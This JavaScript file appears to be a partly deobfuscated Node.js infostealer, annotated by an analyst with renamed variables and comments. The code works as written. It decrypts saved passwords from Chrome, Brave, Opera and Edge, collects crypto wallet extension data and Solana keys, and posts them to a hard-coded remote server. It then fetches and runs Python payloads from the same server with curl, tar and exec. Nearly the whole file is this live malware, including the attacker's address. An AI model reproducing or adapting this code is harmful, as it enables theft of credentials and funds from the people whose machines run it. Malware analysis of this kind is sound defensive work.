// t
const base64 = 'base64',
  // c
  utf8 = 'utf8',
  // r
  decodeHeader = (input) => {
    let s1 = input.slice(1);
    return Buffer.from(s1, base64).toString(utf8);
  },
  // e
  xorDecrypt = (input, key) => {
    let encryptedBuffer = Buffer.from(input, base64);
    const length = encryptedBuffer.length;
    let decryptedArray = new Uint8Array(length);
    for (let ii = 0; ii < length; ii++) {
      const keyIndex = 3 & ii;
      let keyValue = key.charCodeAt(keyIndex);
      decryptedArray[ii] = 255 & (encryptedBuffer[ii] ^ keyValue);
    }
    return Buffer.from(decryptedArray).toString(utf8);
  },
  // E
  decryptWithUtf8 = (input) => xorDecrypt(input, utf8),
  // o - Not sure if its xorKey
  xorKey = 'charCodeAt',
  // s
  sqlite3_string = 'sqlite3',
  // F
  child_process = 'child_process',
  // a
  crypto_string = 'crypto',
  // B
  exec = 'exec',
  // i
  request = 'request',
  // A
  path_string = 'path',
  // $
  platform_string = 'platform',
  // n
  tmpdir_string = 'tmpdir',
  // l
  home_dir_string = 'homedir',
  // R
  hostname_string = 'hostname',
  // W
  type_string = 'type',
  // V
  os = require('os'),
  // U - path
  path = require(path_string),
  // Q - sqlite3
  sqlite3 = require(sqlite3_string),
  // g - crypto
  crypto = require(crypto_string),
  // h - request
  request_module = require(request),
  // w - childprocesses[exec]
  child_process_exec = require(child_process)[exec],
  // x - os[hostname]
  hostname = os[hostname_string](),
  // f - os[platform]
  platform = os[platform_string](),
  // y - os[homedir]
  homedir = os[home_dir_string](),
  // I - os[tmpdir]
  tempdir = os[tmpdir_string](),
  // G - os[type]
  type = os[type_string](),
  // S
  fs = require('fs');

// u
let uninitializedVar;
// d
const decryptWithUtf8_v2 = (input) => xorDecrypt(input, utf8),
  // X - IP: http://144.172.74.48:1224
  constructURL = (() => {
    let originalString = 'MTQ0LjE3MiaHR0cDovLw43NC40ODoxMjI0      ';
    let part1 = 'b',
      part2 = 'a',
      part3 = '',
      part4 = '';
    for (let i = 0; i < 10; i++) {
      part1 += originalString[i];
      part2 += originalString[10 + i];
      part3 += originalString[20 + i];
      part4 += originalString[30 + i];
    }
    let shuffledString = part1 + part3 + part4;
    return decodeHeader(part2) + decodeHeader(shuffledString);
  })(),
  // C
  decodedPath = '/.npl',
  // H
  replacePath = (input) =>
    input.replace(/^~([a-z]+|\/)/, (match, group) =>
      '/' === group ? homedir : `${path[decodedPath](homedir)}/${group}`
    ),
  // Y
  mysteryVar1 = 'S2t5OA8',
  // D - Used for Decoding Variables Below
  mysteryVar2 = 'AgYPTBAyD1QQJx9WFg',
  // k - Used for Decoding Variables Below
  mysteryVar3 = 'EhES',
  // b - Used for Decoding Variables Below
  mysteryVar4 = 'WhcKURAaEg',
  // M - this is the file location of the python script that gets downloaded from the remote server
  npl_string = '/.npl',
  // N - this is the endpoint on the remote server that the python script gets downloaded from
  client_string = '/client',
  // p
  writeFileSync_string = 'writeFileSync',
  // Z - request method
  get_string = 'get',
  // m
  existsSync_string = 'existsSync',
  // J
  store_node_string = 'WgcSVwcRSFYaEAM',
  // T
  accessSync_string = 'accessSync';

// j
function checkFileExists(filePath) {
  try {
    fs[accessSync_string](filePath);
    return true;
  } catch (error) {
    return false;
  }
}

// v
const Default_string = 'Default',
  // O
  Profile_string = 'Profile',
  // K
  Edge_UserData_string = '/AppData/Local/Microsoft/Edge/User Data',
  // P
  windows_main = (input1, input2) => {
    let result = '';
    try {
      const r = `${input1}`,
        e = require(`${homedir}${decryptWithUtf8_v2(store_node_string)}`);
      // if G !== Windows_NT
      if (type != 'Windows_NT') return;
      // E
      const SQL_LOGINS_QUERY = 'SELECT * FROM logins',
        // s
        s = `${replacePath('~/')}${input2}`;
      // F
      let F = path.join(s, 'Local State');
      // a
      const a = 'aes-256-gcm',
        // B
        B = 'origin_url',
        // i
        i = 'username_value',
        // A
        A = 'password_value',
        // $
        $ = 'CryptUnprotectData',
        // n
        createDecipheriv_string = 'createDecipheriv',
        // l
        readFileString = 'readFile',
        // R
        R = 'copyFile',
        // W
        W = 'Login Data',
        // V
        V = 'os_crypt',
        // h
        h = 'encrypted_key',
        // w
        Database_String = 'Database',
        // x
        x = 'latin1',
        // f
        f = 'U: ',
        // I
        I = 'W: ',
        // u
        u = 'P: ',
        // X
        X = 'unlink';

      fs[readFileString](child_process, 'utf-8', (input1, input2) => {
        if (!input1) {
          (mkey = JSON.parse(input2)),
            (mkey = mkey[V][h]),
            (mkey = ((t) => {
              var c = atob(t),
                r = new Uint8Array(c.length);
              for (let t = 0; t < c.length; t++) r[t] = c[xorKey](t);
              return r;
            })(mkey));

          try {
            const t = e[$](mkey.slice(5));

            for (let ii = 0; ii <= 200; ii++) {
              const c = 0 === ii ? Default_string : `${Profile_string} ${ii}`,
                e = `${sqlite3_string}/${c}/${W}`,
                o = `${sqlite3_string}/t${c}`;
              if (!checkFileExists(e)) continue;
              const F = `${r}_${ii}_${Profile_string}`;
              fs[R](e, o, (callback) => {
                try {
                  const c = new sqlite3[Database_String](o);
                  c.all(SQL_LOGINS_QUERY, (input1, input2) => {
                    var E = '';
                    input1 ||
                      input2.forEach((value) => {
                        var r = value[B],
                          e = value[i],
                          o = value[A];
                        try {
                          'v' === o.subarray(0, 1).toString() &&
                            ((iv = o.subarray(3, 15)),
                            (cip = o.subarray(15, o.length - 16)),
                            cip.length &&
                              ((mmm = crypto[createDecipheriv_string](
                                a,
                                t,
                                iv
                              ).update(cip)),
                              (E = `${E}${I}${r} ${f} ${e} ${u}${mmm.toString(
                                x
                              )}\n\n`)));
                        } catch (t) {}
                      }),
                      c.close(),
                      fs[X](o, (t) => {}),
                      Ut(F, E);
                  });
                } catch (t) {}
              });
            }
          } catch (t) {}
        }
      });
    } catch (t) {}
  };

const q = 'filename',
  z = 'multi_file',
  L = 'formData',
  _ = 'url',
  tt = 'options',
  ct = 'value',
  rt = 'readdirSync',
  et = 'statSync',
  Et = ('isDirectory', 'post'),
  ot = [
    [
      '/Library/Application Support/Google/Chrome',
      '/.config/google-chrome',
      '/AppData/Local/Google/Chrome/User Data',
    ],
    [
      '/Library/Application Support/BraveSoftware/Brave-Browser',
      '/.config/BraveSoftware/Brave-Browser',
      '/AppData/Local/BraveSoftware/Brave-Browser/User Data',
    ],
    [
      '/Library/Application Support/com.operasoftware.Opera',
      '/.config/opera',
      '/AppData/Roaming/Opera Software/Opera Stable/User Data',
    ],
  ],
  st = 'Local Extension Settings',
  Ft = '.log',
  at = '.ldb',
  Bt = 'solana_id.txt';
let it = 'comp';

// All Crypto Wallet Browser Extensions
const At = [
    'Gx8EUR0SBF0aEwddFBsDUBkRAFYeGwJaEBIBSBIfCFY',
    'EB4EWRkWB1MaBApbHRgBUBAXAlkZGQNdEBUMVhwZDlU',
    'FxIIWRAYC1cYEQ9VHRgWVRIeCFIaBA5QBR8NVxkeFlk',
    'HBYIXR8QAFIYGQ1IFhoKSBAWDVQYGg1XEBsPUBoSA1s',
    'ExwEVx0dC1kQGARXHQQMWhcYAlsbEwVWFAQIXBoQDEg',
    'HRoAWRsfCFcWEgNXExYCXBIXD1IbGQ5WExoNXBsVB1w',
    'FBEHWx0fCFUQEhZQEAQFWxwbCFoaGw5bHhsIVxARC18',
    'HR0AWRMTC1sWEBZdHgQKVxgeDFMWEgFXERoOWxAYClI',
  ],
  $t = 'createReadStream',
  nt = '/uploads',
  // Extracts all the crypto wallet files from the browser extensions
  lt = async (t, c, r) => {
    let e = t;
    if (!e || '' === e) return [];
    try {
      if (!checkFileExists(e)) return [];
    } catch (t) {
      return [];
    }
    c || (c = '');
    let E = [];
    for (let r = 0; r < 200; r++) {
      const o = `${t}/${
        0 === r ? Default_string : `${Profile_string} ${r}`
      }/${st}`;

      for (let t = 0; t < At.length; t++) {
        const s = decryptWithUtf8(At[t]);
        let F = `${o}/${s}`;
        if (checkFileExists(F)) {
          try {
            far = fs[rt](F);
          } catch (t) {
            far = [];
          }

          far.forEach(async (t) => {
            e = path.join(F, t);
            try {
              (e.includes(Ft) || e.includes(at)) &&
                E.push({
                  [ct]: fs[$t](e),
                  [tt]: { [q]: `${c}${r}_${s}_${t}` },
                });
            } catch (t) {}
          });
        }
      }
    }

    if (
      r &&
      ((e = `${homedir}${'/.config/solana/id.json'}`), fs[existsSync_string](e))
    )
      try {
        E.push({ [ct]: fs[$t](e), [tt]: { [q]: Bt } });
      } catch (t) {}
    const o = { type: mysteryVar1, hid: it, [z]: E };
    try {
      const t = { [_]: `${constructURL}${nt}`, [L]: o };
      request_module[Et](t, (t, c, r) => {});
    } catch (t) {}
    return E;
  },
  Rt = () => {
    try {
      ot.forEach((t, c) => {
        windows_main(c, t[2]);
      }),
        windows_main(3, Edge_UserData_string);
    } catch (t) {}
  },
  Wt = '/keys',
  Vt = 'python',
  Ut = async (t, c) => {
    const r = {
        ts: uninitializedVar.toString(),
        type: mysteryVar1,
        hid: it,
        ss: t,
        cc: c.toString(),
      },
      e = { [_]: `${constructURL}${Wt}`, [L]: r };
    try {
      request_module[Et](e, (t, c, r) => {});
    } catch (t) {}
  },
  Qt = 'p.zi',
  gt = '/pdown',
  ht = 'renameSync',
  wt = 'rename',
  xt = 'rmSync',
  ft = 'tar -xf',
  yt = 'curl -Lo',
  It = '\\.pyp\\python.exe',
  Gt = 51476596;
let St = 0;

const ut = async (t) => {
    child_process_exec(`${ft} ${t} -C ${homedir}`, (c, r, e) => {
      if (c) return console.error(`err unfile: ${c}`), fs[xt](t), void (St = 0);
      fs[xt](t), Ht();
    });
  },
  dt = () => {
    const t = 'p2.zip',
      c = `${constructURL}${gt}`,
      r = `${tempdir}\\${Qt}`,
      e = `${tempdir}\\${t}`;
    if (!(St >= Gt)) {
      if (fs[existsSync_string](r)) {
        try {
          var E = fs[et](r);
          E.size >= Gt
            ? ((St = E.size),
              fs[wt](r, e, (t) => {
                if (t) throw t;
                ut(e);
              }))
            : (St < E.size ? (St = E.size) : (fs[xt](r), (St = 0)), Xt());
        } catch (t) {}
      }
    } else {
      child_process_exec(`${yt} "${r} "${c}"`, (t, c, E) => {
        if (t) return (St = 0), void Xt();
        try {
          (St = Gt), fs[ht](r, e), ut(e);
        } catch (t) {}
      });
    }
  };

function Xt() {
  setTimeout(() => {
    dt();
  }, 2e4);
}

const Ct = async () => {
  var t = process.version.match(/^v(\d+\.\d+)/)[1];
  const c = `${constructURL}${'/node/'}${t}`,
    r = `${homedir}${decryptWithUtf8_v2(store_node_string)}`;
  if (fs[existsSync_string](r)) Rt();
  else {
    child_process_exec(`${yt} "${r}" "${c}"`, (t, c, r) => {
      Rt();
    });
  }
};

const Ht = async () =>
  await new Promise((t, c) => {
    if ('w' == platform[0]) {
      const t = `${homedir}${It}`;
      fs[existsSync_string](`${t}`)
        ? (() => {
            const t = `${constructURL}${client_string}/${mysteryVar1}`,
              c = `${homedir}${npl_string}`,
              r = `"${homedir}${It}" "${c}"`;
            try {
              fs[xt](c);
            } catch (t) {}
            request_module[get_string](t, (t, e, E) => {
              if (t) Ct();
              else
                try {
                  fs[writeFileSync_string](c, E),
                    child_process_exec(r, (t, c, r) => {
                      Ct();
                    });
                } catch (t) {
                  Ct();
                }
            });
          })()
        : (Ct(), dt());
    } else
      (() => {
        const t = '/client',
          c = 'writeFileSync',
          r = 'get',
          e = `${constructURL}${t}/${mysteryVar1}`,
          E = `${homedir}${npl_string}`;
        let o = `${Vt}3 "${E}"`;
        request_module[r](e, (t, r, e) => {
          t || (fs[c](E, e), child_process_exec(o, (t, c, r) => {}));
        });
      })();
  });

var Yt = 0;

// Malware Entry Point
const Dt = async () => {
  try {
    (uninitializedVar = Date.now()),
      await (async () => {
        it = hostname;
        try {
          const t = replacePath('~/');
          ot.forEach(async (c, r) => {
            let e = '';
            (e =
              'd' == platform[0]
                ? `${t}${c[0]}`
                : 'l' == platform[0]
                ? `${t}${c[1]}`
                : `${t}${c[2]}`),
              await lt(e, `${r}_`, 0 == r);
          }),
            'w' == platform[0] &&
              ((pa = `${t}${Edge_UserData_string}`), await lt(pa, '3_', !1));
        } catch (t) {}
      })(),
      Ht();
  } catch (t) {}
};

// const decrypt_E = [
//   'Gx8EUR0SBF0aEwddFBsDUBkRAFYeGwJaEBIBSBIfCFY',
//   'EB4EWRkWB1MaBApbHRgBUBAXAlkZGQNdEBUMVhwZDlU',
//   'FxIIWRAYC1cYEQ9VHRgWVRIeCFIaBA5QBR8NVxkeFlk',
//   'HBYIXR8QAFIYGQ1IFhoKSBAWDVQYGg1XEBsPUBoSA1s',
//   'ExwEVx0dC1kQGARXHQQMWhcYAlsbEwVWFAQIXBoQDEg',
//   'HRoAWRsfCFcWEgNXExYCXBIXD1IbGQ5WExoNXBsVB1w',
//   'FBEHWx0fCFUQEhZQEAQFWxwbCFoaGw5bHhsIVxARC18',
//   'HR0AWRMTC1sWEBZdHgQKVxgeDFMWEgFXERoOWxAYClI',
// ];

// for (let i = 0; i < decrypt_E.length; i++) {
//   console.log({
//     key: decrypt_E[i],
//     value: decryptWithUtf8(decrypt_E[i]),
//   });
// }

// const decrypt_d = ['WhcKURAaEg', 'AgYPTBAyD1QQJx9WFg', 'EhES'];

// for (let i = 0; i < decrypt_d.length; i++) {
//   console.log({
//     key: decrypt_d[i],
//     value: decryptWithUtf8_v2(decrypt_d[i]),
//   });
// }
